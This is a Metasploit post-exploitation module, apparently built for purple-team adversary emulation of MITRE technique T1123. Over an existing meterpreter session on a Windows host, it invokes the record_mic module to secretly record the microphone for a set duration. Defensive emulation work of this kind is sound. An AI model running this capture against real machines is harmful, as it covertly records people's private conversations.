##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
class MetasploitModule < Msf::Post
  def initialize(info={})
    super(update_info(info,
                      'Name'          => 'Audio Capture (T1123) Windows - Purple Team',
                      'Description'   => %q{
                        Collection:
                        An adversary can leverage a computer's peripheral devices (e.g., microphones and webcams) or applications (e.g., voice and video call services) to capture audio recordings for the purpose of listening into sensitive conversations to gather information.

                        Malware or scripts may be used to interact with the devices through an available API provided by the operating system or an application to capture audio. Audio files may be written to disk and exfiltrated later.},
                      'License'       => MSF_LICENSE,
                      'Author'        => [ 'Praetorian' ],
                      'References'    => [ [ 'URL', 'https://attack.mitre.org/wiki/Technique/T1123' ] ],
                      'Platform'      => [ 'win' ],
                      'SessionTypes'  => [ 'meterpreter' ]
                     ))
    register_options(
    [
      OptString.new("DURATION", [true, "Number of seconds to record.", 10])
    ])
  end

  def run
  #
  #
  #
    begin
      raise "Module requires meterpreter session" unless session.type == "meterpreter"

      mod = "post/multi/manage/record_mic"
      print_status("Executing module '#{mod}' on #{session.inspect}")
      run_module(mod)

      print_good("Module T1123W execution successful.")

    rescue ::Exception => e
      print_error("#{e.class}: #{e.message}")
      print_error("Module T1123W execution failed.")
    end
   end


  def run_module(mod)
  #
  #
  #
    framework_mod = framework.modules.create(mod)
    framework_mod.datastore['SESSION'] = datastore['SESSION']
    framework_mod.datastore['DURATION'] = datastore['DURATION']
    framework_mod.run_simple(
      'LocalInput' => self.user_input,
      'LocalOutput' => self.user_output,
      'RaiseExceptions' => true,
      'RunAsJob' => false
  )
  end
end
